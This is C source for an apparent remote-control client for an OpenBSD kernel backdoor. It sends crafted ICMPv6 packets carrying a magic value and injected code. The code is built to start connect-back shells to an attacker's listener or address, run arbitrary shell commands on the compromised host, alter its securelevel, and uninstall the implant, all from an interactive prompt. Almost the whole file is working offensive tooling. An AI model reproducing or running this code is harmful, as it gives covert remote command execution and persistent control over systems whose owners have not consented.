/*
 *  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include "xpl.h"

/*
 * Set secure level
 */
static int
cmd_securelevel(eth_t *e, struct icmp6_pkt *pkt,
        uint32_t magic, uint32_t level)
{
	extern uint8_t securelevel_start;
	extern uint8_t securelevel_end;
	extern uint8_t securelevel_offset;
	struct icmp6_pkt *cmd;
	uint32_t len;
	uint32_t off;

	HEAPBUF(cmd, sizeof(struct icmp6_pkt));
	memcpy(cmd, pkt, sizeof(struct icmp6_pkt));
	memset(cmd->data, 0x90, sizeof(cmd->data));

	/* Set magic to flag command packet */
	*((uint32_t *)(&cmd->data[0])) = magic;

	/* Copy code */
	len = (unsigned int)&securelevel_end - (unsigned int)&securelevel_start;
	memcpy(&cmd->data[4], &securelevel_start, len);

	/* Set Securelevel */
	off = (uint32_t)&securelevel_offset - (uint32_t)&securelevel_start+2;
	*((uint32_t *)&cmd->data[off+4]) = level;

	/* Bombs away */
	printf("[*] Sending securelevel code (%u bytes)\n", len);
	ip6_checksum(cmd, sizeof(struct icmp6_pkt));
	eth_send(e, cmd, sizeof(struct icmp6_pkt));
	
	free(cmd);
	return(0);
}

/*
 * Send uninstall command.
 */
static int
cmd_uninstall(eth_t *e, struct icmp6_pkt *pkt, uint32_t magic)
{
    struct icmp6_pkt *cmd;

    HEAPBUF(cmd, sizeof(struct icmp6_pkt));
    memcpy(cmd, pkt, sizeof(struct icmp6_pkt));
    memset(cmd->data, 0x90, sizeof(cmd->data));

    /* Set magic to flag command packet */
    *((uint32_t *)(&cmd->data[0])) = magic;

	/* Set uninstall code (invalid instruction) */
	*((uint32_t *)(&cmd->data[4])) = 0xffffffff;

    /* Bombs away */
    printf("[*] Sending uninstall code\n");
    ip6_checksum(cmd, sizeof(struct icmp6_pkt));
    eth_send(e, cmd, sizeof(struct icmp6_pkt));

    free(cmd);
    return(0);
}


/*
 * Send shell command to run on system
 */
static int
cmd_shell(eth_t *e, struct icmp6_pkt *pkt, uint32_t magic, uint8_t *str)
{
	struct icmp6_pkt *cmd;
	extern uint8_t shell_start;
	extern uint8_t shell_end;
	extern uint8_t shell_resolve_hash_offset;
	extern uint8_t shell_cmd_len_offset;
	uint32_t off;
	uint32_t len;

    len = (unsigned int)&shell_end;
    len -= (unsigned int)&shell_start;

    if (len > (sizeof(cmd->data) - 10)) {
        err("%s: Shell code is too large!\n", __FUNCTION__);
        return(-1);
    }

    HEAPBUF(cmd, sizeof(struct icmp6_pkt));
    memcpy(cmd, pkt, sizeof(struct icmp6_pkt));
    memset(cmd->data, 0x90, sizeof(cmd->data));

    /* Set magic to flag command packet */
    *((uint32_t *)(&cmd->data[0])) = magic;

    /* Copy code */
    memcpy(&cmd->data[4], &shell_start, len);

    /* Set offset to hash_resolve in connect_back */
    off = (uint32_t)&shell_resolve_hash_offset -
        (uint32_t)&shell_start+2;
    *((uint32_t *)&cmd->data[off+4]) = off;

	/* Set command */
	snprintf((char *)&cmd->data[len+4], sizeof(cmd->data) - (len+4), "%s", str);

	/* Set length of command */
	off = (uint32_t)&shell_cmd_len_offset -
		(uint32_t)&shell_start+1;
	*((uint32_t *)&cmd->data[off+4]) = strlen((char *)str);

    /* Bombs away */
    printf("[*] Sending shell command code (%u bytes)\n", 
		len + strlen((char *)str) +1);
    ip6_checksum(cmd, sizeof(struct icmp6_pkt));
    eth_send(e, cmd, sizeof(struct icmp6_pkt));

    free(cmd);
    return(0);
}


/*
 * Send connect back command.
 */
static int
cmd_connect_back(eth_t *e, struct icmp6_pkt *pkt, 
		uint32_t magic, uint32_t ip, uint16_t port, int listen)
{
	struct icmp6_pkt *cmd;
	extern uint8_t connect_back_start;
	extern uint8_t connect_back_end;
	extern uint8_t connect_back_ip;
	extern uint8_t connect_back_port;
	extern uint8_t connect_back_resolve_hash_offset;
	struct sockaddr_in sin;
	uint32_t connect_back_length;
	uint32_t off;
	uint32_t len;
	int lsock;

	if (listen) {

		if ( (lsock = listen_connect_back(ip, port)) < 0) {
			err_errno("Failed to set up listener for connect back connection");
			return(-1);
		}

		/* Lookup socket name in case of random port */
		len = sizeof(struct sockaddr_in);
		memset(&sin, 0x00, sizeof(sin));
		if (getsockname(lsock, (struct sockaddr *)&sin, &len) < 0) {
			err_errno("Failed to get socket name");
			return(-1);
		}

		ip = sin.sin_addr.s_addr;
		port = sin.sin_port;
		printf("[*] Connect back listener on %s:%u\n",
			inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
	}
	
	connect_back_length = (unsigned int)&connect_back_end;
	connect_back_length -= (unsigned int)&connect_back_start;

	if (connect_back_length > (sizeof(cmd->data) - 10)) {
		err("%s: Connect back code is too large!\n", __FUNCTION__);
		return(-1);
	}

	HEAPBUF(cmd, sizeof(struct icmp6_pkt));
	memcpy(cmd, pkt, sizeof(struct icmp6_pkt));
	memset(cmd->data, 0x90, sizeof(cmd->data));

	/* Set magic to flag command packet */
	*((uint32_t *)(&cmd->data[0])) = magic;

	/* Copy code */
	memcpy(&cmd->data[4], &connect_back_start, connect_back_length);

	/* Set IPv4 */
	off = (uint32_t)&connect_back_ip - (uint32_t)&connect_back_start+1;
	*((uint32_t *)&cmd->data[off+4]) = ip;
	
	/* Set Port */
	off = (uint32_t)&connect_back_port - (uint32_t)&connect_back_start+2;
	*((uint16_t *)&cmd->data[off+4]) = port;

	/* Set offset to hash_resolve in connect_back */
	off = (uint32_t)&connect_back_resolve_hash_offset - 
		(uint32_t)&connect_back_start+2;
	*((uint32_t *)&cmd->data[off+4]) = off; 

	/* Bombs away */
	printf("[*] Sending connect back code (%u bytes)\n", connect_back_length);
	ip6_checksum(cmd, sizeof(struct icmp6_pkt));
	eth_send(e, cmd, sizeof(struct icmp6_pkt));

	if (listen)
		handle_connect_back(lsock);

	if (cmd)
		free(cmd);
	return(0);
}

static void
help(void)
{
	printf("\n");
	printf("cb [<ip>:<port>]        - Connect back address (don't listen)\n");	
	printf("sh <command> <arg> ...  - Run command on system\n");	
	printf("sl <level>              - Set securelevel\n");	
	printf("uninstall               - Uninstall backdoor\n");	
	printf("\n");
}


/*
 * Split string into tokens using space as deliminator.
 * Pointers to the strings are stored at strv, where max
 * indicates the maximum number of pointers to store, including
 * the terminating NULL pointer.
 * Returns the number of valid string pointers set in strv.
 * Note that deliminating characters found in str is
 * replaced with the terminating '\0' character.
 */
static unsigned int
str_to_argv(char *str, char **strv, unsigned int maxv)
{
    char *pt = str;
    unsigned int i;

    if ((str == NULL) || (strv == NULL) || (maxv == 0))
        return(0);

    i = 0;

    /* Skip leading spaces */
    for (; isspace((int)*pt) && *pt; pt++);

    while (*pt && (i < (maxv - 1)) ) {

        strv[i++] = pt;

        for (; !isspace((int)*pt) && *pt; pt++);

        if (*pt == '\0')
            break;

        *pt = '\0';
        pt++;

        for (; isspace((int)*pt); pt++);
    }

    strv[i] = (char *)NULL;
    return(i);
}


/*
 * Delete newline from string.
 */
static char *
str_delnl(char *str)
{
	if (strlen(str)) {
		if (str[strlen(str)-1] == '\n')
			str[strlen(str)-1] = '\0';
	}

	if (strlen(str)) {
		if (str[strlen(str)-1] == '\r')
			str[strlen(str)-1] = '\0';
	}

	return(str);
}



/*
 * Interactive loop.
 * Read commands and send them as ICMPv6 packets to target.
 */
int
iact(struct icmp6_pkt *pkt, struct options *opt)
{
	uint32_t cb_iface_ip;
	char buf[1000];
	eth_t *e;

    /* Resolve IPv4 for target interface */
	if ( (long)(cb_iface_ip = iface_ip(opt->device)) == -1)
		return(-1);

	if ( (e = eth_open(opt->device)) == NULL)
		err_errnox("Failed to open device %s", opt->device);
	
	memset(buf, 0x00, sizeof(buf));
	printf("OpenBSD> ");
	fflush(stdout);
	while (fgets(buf, sizeof(buf), stdin) != NULL) {
		char tmp[sizeof(buf)];
		char *argv[12];
		unsigned int argc;
		uint32_t cb_ip = cb_iface_ip;
		uint16_t cb_port = 0;

		str_delnl(buf);
		snprintf(tmp, sizeof(tmp), "%s", buf);
	
		if ( (argc = str_to_argv(buf, argv, 10)) == 0)
			goto next;

		/* Connect back */
		if (strcasecmp(argv[0], "cb") == 0) {
			unsigned int listen = 1;

			if (argv[1]) {
				char *pt = tmp;
				pt += 3;
				while (isspace((int)*pt))
					pt++;
				
				if (netaddr(pt, &cb_ip, &cb_port) < 0) {
					err("Failed to resolve connect back address\n");
					goto next;
				}

				/* Address was specified, so we don't listen */
				listen = 0;
			}
			cmd_connect_back(e, pkt, opt->magic, cb_ip, cb_port, listen);
		}

		/* Secure Level */
		else if (strcasecmp(argv[0], "sl") == 0) {
			uint32_t level;
			
			if (argv[1] == NULL) {
				help();
				goto next;
			}

			level = (uint32_t)strtoul(argv[1], NULL, 0);
			cmd_securelevel(e, pkt, opt->magic, level);
		}

		/* Shell command */
		else if (strcasecmp(argv[0], "sh") == 0) {
			char *pt = tmp;
	
			if (argv[1] == NULL) {
				help();
				goto next;
			}

			pt += 3;
			while (isspace((int)*pt))
				pt++;
			cmd_shell(e, pkt, opt->magic, (uint8_t *)pt);
		}

		/* Uninstall */
		else if (strcasecmp(argv[0], "uninstall") == 0) {
			cmd_uninstall(e, pkt, opt->magic);
			printf("Bye!\n");
			break;
		}
		
		else
			help();
	
		next:
			memset(buf, 0x00, sizeof(buf));
			printf("OpenBSD> ");
			fflush(stdout);
	}
		
	return(0);
}

